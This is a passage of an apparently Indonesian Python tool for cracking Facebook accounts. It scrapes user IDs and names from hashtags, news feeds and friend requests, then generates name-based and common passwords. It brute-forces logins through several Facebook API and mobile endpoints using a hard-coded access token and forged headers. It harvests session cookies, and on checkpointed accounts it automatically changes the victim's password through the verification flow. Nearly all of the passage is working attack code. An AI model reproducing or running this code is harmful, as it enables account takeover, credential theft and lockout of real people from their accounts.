            try:nama = _query_2_;email = ('%s%s'%(_query_2_,str(_hitung_email_2_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_2_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:nama = _query_3_;email = ('%s%s'%(_query_3_,str(_hitung_email_3_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_3_ += 1
            except:continue
        for _jumlah_ in range(_limit_awal_,_limit_akhir_):
            try:
                if '.' in __query__:_query_ = __query__;nama = __query__.replace('.',' ')
                elif '_' in __query__:_query_ = __query__;nama = __query__.replace('_',' ')
                elif '-' in __query__:_query_ = __query__;nama = __query__.replace('-',' ')
                else:_query_ = __query__.replace(' ','');nama = __query__
                email = ('%s%s'%(_query_,str(_hitung_email_full_)));_dapunta_dapunta_(_file_,'a+').write('%s•%s\n'%(email,nama));_hitung_email_full_ += 1
            except:continue
    except:jalan('%s╚══[%s!%s] %sTerjadi Kesalahan'%(M,P,M,P));time.sleep(2);menu()
    _buka_file_ = _dapunta_dapunta_(_file_,'r').read().splitlines();_dapunta_cici_("%s╠══[%s•%s] %sTotal ID : %s"%(O,P,O,P,str(len(_buka_file_))))
    return crack(_file_)

### Dump ID Dari Hashtag
def hashtag(cookies):
    _query_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Hashtag : '%(O,P,O,P));_url_dev_ = 'https://mbasic.facebook.com/hashtag/' + _query_;_file_ = (_query_+'.json').replace(' ','_')
    try:os.remove(_file_)
    except:pass
    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_hashtag(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_hashtag(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_hashtag);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            for _dapunta_ in _cici_.find_all('a',href=True):
                if 'mbasic.facebook.com' in _dapunta_.get('href'):pass
                else:
                    if "profile.php" in _dapunta_.get('href'):
                        try:
                            _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_dapunta_.get("href")))
                            if _name_dev_ in _buka_file_:pass
                            elif '/' in _id_dev_:pass
                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                        except:pass
                    else:
                        try:
                            _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("/(.*?)\?",_dapunta_.get("href")))
                            if _name_dev_ in _buka_file_:pass
                            elif '/' in _id_dev_:pass
                            else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                        except:pass
            for _dapunta_ in _sop_dev_.find_all('a',href=True):
                if 'Lihat Hasil Selanjutnya' in _dapunta_.text:url_dev = _dapunta_.get('href');exec_hashtag(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Dump ID Dari Beranda
def beranda(cookies):
    _url_dev_ = 'https://mbasic.facebook.com/home.php';_file_ = 'beranda.json'
    try:os.remove(_file_)
    except:pass
    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_beranda(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_beranda(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_buka_file_ = open(_file_).read();_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _cici_ in _sop_dev_.find_all('h3'):
            for _dapunta_ in _cici_.find_all('a',href=True):
                if "profile.php" in _dapunta_.get('href'):
                    try:
                        _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",_dapunta_.get("href")))
                        if _name_dev_ in _buka_file_:pass
                        elif '/' in _id_dev_:pass
                        else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                    except:pass
                else:
                    try:
                        _name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall("/(.*?)\?",_dapunta_.get("href")))
                        if _name_dev_ in _buka_file_:pass
                        elif '/' in _id_dev_:pass
                        else:open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                    except:pass
            for _dapunta_ in _sop_dev_.find_all('a',href=True):
                if 'Lihat Berita Lain' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_beranda(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Dump ID Permintaan Pertemanan Masuk
def permintaan_pertemanan_masuk(cookies):
    _url_dev_ = 'https://mbasic.facebook.com/friends/center/requests';_file_ = 'teman_masuk.json'
    try:os.remove(_file_)
    except:pass
    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_permintaan_pertemanan_masuk(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_permintaan_pertemanan_masuk(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _dapunta_ in _sop_dev_.find_all('a',href=True):
            if '/friends/hovercard' in _dapunta_.get('href'):
                try:_name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall('uid=(.*?)&',_dapunta_.get('href')));open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _dapunta_ in _sop_dev_.find_all('a',href=True):
            if 'Lihat selengkapnya' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_permintaan_pertemanan_masuk(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Dump ID Permintaan Pertemanan Keluar
def permintaan_pertemanan_keluar(cookies):
    _url_dev_ = 'https://mbasic.facebook.com/friends/center/requests/outgoing';_file_ = 'teman_keluar.json'
    try:os.remove(_file_)
    except:pass
    _dapunta_cici_("%s╠══[%s•%s] %sTekan ctrl+c Untuk Berhenti Dump"%(O,P,O,P));exec_permintaan_pertemanan_keluar(_url_dev_,cookies,_file_);_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)
def exec_permintaan_pertemanan_keluar(url,cookies,_file_):
    open(_file_,'a');_req_ses_ = requests.Session();_req_get_ = _req_ses_.get(url,cookies=cookies,headers=header_nama);_sop_dev_ = par(_req_get_.text,'html.parser');_dapunta_cici_ ("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())),end='');sys.stdout.flush()
    try:
        for _dapunta_ in _sop_dev_.find_all('a',href=True):
            if '/friends/hovercard' in _dapunta_.get('href'):
                try:_name_dev_ = _dapunta_.text;_id_dev_ = "".join(bs4.re.findall('uid=(.*?)&',_dapunta_.get('href')));open(_file_,'a+').write('%s•%s\n'%(_id_dev_,_name_dev_))
                except:pass
            else:pass
        for _dapunta_ in _sop_dev_.find_all('a',href=True):
            if 'Lihat selengkapnya' in _dapunta_.text:url_dev = 'https://mbasic.facebook.com/' + _dapunta_.get('href');exec_permintaan_pertemanan_keluar(url_dev,cookies,_file_)
    except KeyboardInterrupt:_dapunta_cici_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID"%(O,P,O,P,len(_dapunta_dapunta_(_file_).read().splitlines())));return crack(_file_)

### Cek Target Crack
def cek_target_crack_(_id_):
    open('list_id.txt','a+')
    try:
        _cek_ = open('list_id.txt','r').read()
        if _id_ in _cek_:
            if _id_ == 'me':pass
            else:
                _cokzz_ = _cici_dapunta_('%s╠══[%s!%s] %sID Sudah Pernah Dicrack, Lanjut? [y/t] : '%(M,P,M,P))
                if _cokzz_ in ['',' ']:pass
                elif _cokzz_ in ['1','01','y']:pass
                elif _cokzz_ in ['2','02','t']:menu()
                else:pass
        else:_dapunta_dapunta_('list_id.txt',"a+").write("%s\n"%(_id_))
    except:pass

### Generate Password
def generate1(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:continue 
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
            elif len(i)>=6:_dapunta_.append(i);_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
            else:continue
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def generate2(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
            else:_dapunta_.append(i); _dapunta_.append(i+"123");_dapunta_.append(i+"12345")
    _dapunta_.append(_cici_.lower());_dapunta_.append("sayang");_dapunta_.append("bismillah");_dapunta_.append("anjing")
    return _dapunta_
def generate3(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
            else:_dapunta_.append(i);_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
    _dapunta_.append(_cici_.lower());_dapunta_.append("sayang");_dapunta_.append("bismillah");_dapunta_.append("anjing");_dapunta_.append("123456");_dapunta_.append("bangsat");_dapunta_.append("sayangku")
    return _dapunta_
def generate4(_cici_):
    _dapunta_=[]
    ps = _dapunta_dapunta_('pass.txt','r').read()
    pp = _dapunta_dapunta_('passangka.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
        else:_dapunta_.append(i);_dapunta_.append(i+"123");_dapunta_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):_dapunta_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):_dapunta_.append(z)
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def tambah_pass():
    _dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456,786786'%(O,P,O,P));cuy = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P));gh = _dapunta_dapunta_('pass.txt','w');gh.write(cuy);gh.close
def tambah_pass_angka():
    _dapunta_cici_('%s╠══[%s•%s] %sContoh : 321,786,gaming,ganteng'%(O,P,O,P));coy = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Pass Tambahan Dibelakang Nama : '%(O,P,O,P));xy = _dapunta_dapunta_('passangka.txt','w');xy.write(coy);xy.close
    
### Logger Crack
def log_api_1(em,pas):
    ua = _dapunta_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(9999990000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(9999990, 40000)),"x-fb-net-hni": str(random.randint(9999990, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_api_2(em,pas):
    ua = _dapunta_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(9999990000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(9999990, 40000)),"x-fb-net-hni": str(random.randint(9999990, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_1(em,pas):
    ua = _dapunta_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_2(em,pas):
    ua = _dapunta_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mobile_1(em,pas):
    ua = _dapunta_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://m.facebook.com/")
    b = r.post("https://m.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mobile_2(em,pas):
    ua = _dapunta_dapunta_('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://m.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}

### Check Opsi
def cek_opsi(user,pw,format):
    _req_ses_ = requests.Session()
    try:cek_dev_opsi          = open('opsi_dev.txt','r').read()
    except:cek_dev_opsi       = 'null'
    try:_auto_change_pass_    = open('auto_ganti.txt','r').read()
    except:_auto_change_pass_ = 'Ya'
    try:cek_pilih_opsi        = open('muncul_opsi.txt','r').read()
    except:cek_pilih_opsi     = 'Tidak'
    _req_ses_.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua_xiaomi});_sop_dev_ = par(_req_ses_.get(host+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser");_linkurl_ = _sop_dev_.find("form",{"method":"post"})
    for _cici_ in _sop_dev_("input"):data_1.update({_cici_.get("name"):_cici_.get("value")})
    data_1.update({"email":user,"pass":pw});_url_post_ = _req_ses_.post(host+_linkurl_.get("action"),data=data_1);_response_ = par(_url_post_.text, "html.parser")
    if "c_user" in _req_ses_.cookies.get_dict():
        if "Akun Anda Dikunci" in _url_post_.text:pass
        else:_cookies_ = ''.join(_req_ses_.cookies.get_dict());_result_ok_ = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,user,pw,tahun(user),P);cek_apk(_result_ok_,cvt_cookies(_cookies_))
    elif "checkpoint" in _req_ses_.cookies.get_dict():
        _ratya_ = 0;jumlah_opsi  = [];_title_dev_ = re.findall("\<title>(.*?)<\/title>",str(_response_));link_2 = _response_.find("form",{"method":"post"});list_input = ['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for _dapunta_ in _response_("input"):
            if _dapunta_.get("name") in list_input:data_2.update({_dapunta_.get("name"):_dapunta_.get("value")})
        _req_act_ = _req_ses_.post(host+link_2.get("action"),data=data_2);_response2_ = par(_req_act_.text,"html.parser");_check_opsi_  = [_salsabila_.text for _salsabila_ in _response2_.find_all("option")]
        if len(_check_opsi_)==0:
            if "Lihat detail login yang ditampilkan. Ini Anda?" in _title_dev_:
                if _auto_change_pass_ == 'Ya':change_pass(user,_req_ses_,_response_,link_2)
                else:
                    if cek_pilih_opsi == 'Ya':_dapunta_cici_(format);_dapunta_cici_('   %s• %sAkun One Tap'%(H,P));_dapunta_cici_("")
                    else:_dapunta_cici_(format);_dapunta_cici_('   %s• %sAkun One Tap'%(H,P))
            else:pass
        elif len(_check_opsi_)!=0:
            if cek_pilih_opsi == 'Ya':
                for _asu_ in range(len(_check_opsi_)):_ratya_ += 1;jumlah_opsi.append("\n     "+P+str(_asu_+1)+". "+_check_opsi_[_asu_]+" ")
                jumop = ('%s   Ditemukan %s Opsi : '%(P,str(len(jumlah_opsi))));_dapunta_cici_(format);_dapunta_cici_(jumop+"".join(jumlah_opsi));_dapunta_cici_("")
            else:_dapunta_cici_(format)
    else:
        if 'hasil' in cek_dev_opsi:_dapunta_cici_(format);_dapunta_cici_("%s[%s!%s] %sPassword Telah Diubah"%(M,P,M,P));_dapunta_cici_('')
        else:_dapunta_cici_(format)

### Ganti Password
def auto_ganti_pass(_piye_):
    while True:
        _gimana_ = _cici_dapunta_('%s╠══[%s•%s] %sGanti Pass Akun One Tap? [y/t] : '%(O,P,O,P))
        if _gimana_ in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
        elif _gimana_ in ['1','01','001','y','Y']:
            open('auto_ganti.txt','w').write('Ya');_newpass_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Sandi One Tap : '%(O,P,O,P))
            if len(_newpass_)<6:print('%s╚══[%s!%s] %sSandi Minimal 6 Karakter'%(M,P,M,P));time.sleep(3);menu()
            else:open('_new_pass_.txt','w').write(_newpass_)
            if _piye_ == 'Ya':open('muncul_opsi.txt','w').write('Ya')
            elif _piye_ == 'Tidak':open('muncul_opsi.txt','w').write('Tidak')
            else:open('muncul_opsi.txt','w').write('Tidak')
            break
        elif _gimana_ in ['2','02','002','t','T']:open('auto_ganti.txt','w').write('Tidak');pass
        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
        break
def change_pass(user,_req_ses_,_response_,link_2):
    global ok,cp
    files_ok = "OK/%s.txt"%(tanggal)
    try:_new_pass_ = open('_new_pass_.txt','r').read()
    except:_new_pass_ = 'Dapunta99@@@'
    _password_ = ''.join(_new_pass_);_result_ok_ = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for _dapunta_ in _response_("input"):
        if _dapunta_.get("name") in _button_dev_:data_change_1.update({_dapunta_.get("name"):_dapunta_.get("value")})
    _ganti_pass_ = _req_ses_.post(host+link_2.get("action"),data=data_change_1).text;_result_pass_ = par(_ganti_pass_,"html.parser");_link_3_ = _result_pass_.find("form",{"method":"post"});_button_dev__2_ = ["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(_ganti_pass_)):
        for _cici_ in _result_pass_("input"):
            if _cici_.get("name") in _button_dev__2_:data_change_2.update({_cici_.get("name"):_cici_.get("value")})
        data_change_2.update({"password_new":_password_});_ses_final_ = _req_ses_.post(host+_link_3_.get("action"),data=data_change_2);_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in _req_ses_.cookies.get_dict().items()]);__cookies__ = cvt_cookies(_cookies_);cek_apk(_result_ok_,__cookies__);ok.append("%s•%s"%(user,_password_));_dapunta_dapunta_(files_ok,"a+").write("%s•%s\n"%(user,_password_));cp -= 1;pass
    else:pass

### Cek Aplikasi
def cek_apk(h_ok,_dapunta_):
    apk = [];ses_ = requests.Session()
    cek_pilih_opsi = open('muncul_opsi.txt','r').read()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active";dat_game = ses_.get(url,cookies={'cookie':_dapunta_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive";dat_game = ses_.get(url2,cookies={'cookie':_dapunta_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:celeng = asu.find('span').text;apk.append('\n   • '+celeng)
        except:pass
    if cek_pilih_opsi == 'Ya':_dapunta_cici_(h_ok+''.join(apk));_dapunta_cici_('')
    elif cek_pilih_opsi == 'Tidak':_dapunta_cici_(h_ok+''.join(apk))

### Cek Tahun Pembuatan
def tahun(fx):
    if (re.findall("[a-zA-Z]",str(fx))):tahunz=''
    else:
        if len(fx)==15:
            if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
            elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
            elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
            elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
            elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
            elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
            elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
            elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
            elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
            elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
            elif fx[:6] in ['100009']          :tahunz = ' • 2015'
            elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
            elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
            elif fx[:5] in ['10003']           :tahunz = ' • 2018/2019'
            elif fx[:5] in ['10004']           :tahunz = ' • 2019/2020'
            elif fx[:5] in ['10005']           :tahunz = ' • 2020'
            elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
            else:tahunz=''
        elif len(fx) in [9,10]:tahunz = ' • 2008/2009'
        elif len(fx)==8:tahunz = ' • 2007/2008'
        elif len(fx)==7:tahunz = ' • 2006/2007'
        else:tahunz=''
    return tahunz

### Convert Cookies
def cvt_cookies(raw_cookies):
    o = {}
    # _raw_cookies_warvest_ = c_user,datr,dnonce,fr,sb,xs
    # _raw_cookies_aap_     = c_user,fr,sb,xs,datr
    # _cooked_cookies_      = sb,datr,c_user,xs,fr
    kiko = raw_cookies.replace(' ','').split(';')
    for x in kiko:
        y = x.split('=')[0]
        z = x.split('=')[1]
        o.update({y:z})
    cooked_cookies = ('sb=%s; datr=%s; c_user=%s; xs=%s; fr=%s'%(o['sb'],o['datr'],o['c_user'],o['xs'],o['fr']))
    #_cookies_ = {'cookie':cooked_cookies}
    #print(cooked_cookies)
    return cooked_cookies

### Metode Crack
def pilih_methode():
    try:os.remove('metode.txt')
    except:pass
    while True:
        start_method()
        put = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
        if put in ['',' ','  ']:cok = open('metode.txt','w');cok.write('methode_mbasic_v1');cok.close()
        elif put in ['1','01','001','a']:cok = open('metode.txt','w');cok.write('methode_api_v1');cok.close()
        elif put in ['2','02','002','b']:cok = open('metode.txt','w');cok.write('methode_api_v2');cok.close()
        elif put in ['3','03','003','c']:cok = open('metode.txt','w');cok.write('methode_mbasic_v1');cok.close()
        elif put in ['4','04','004','d']:cok = open('metode.txt','w');cok.write('methode_mbasic_v2');cok.close()
        elif put in ['5','05','005','e']:cok = open('metode.txt','w');cok.write('methode_mobile_v1');cok.close()
        elif put in ['6','06','006','f']:cok = open('metode.txt','w');cok.write('methode_mobile_v2');cok.close()
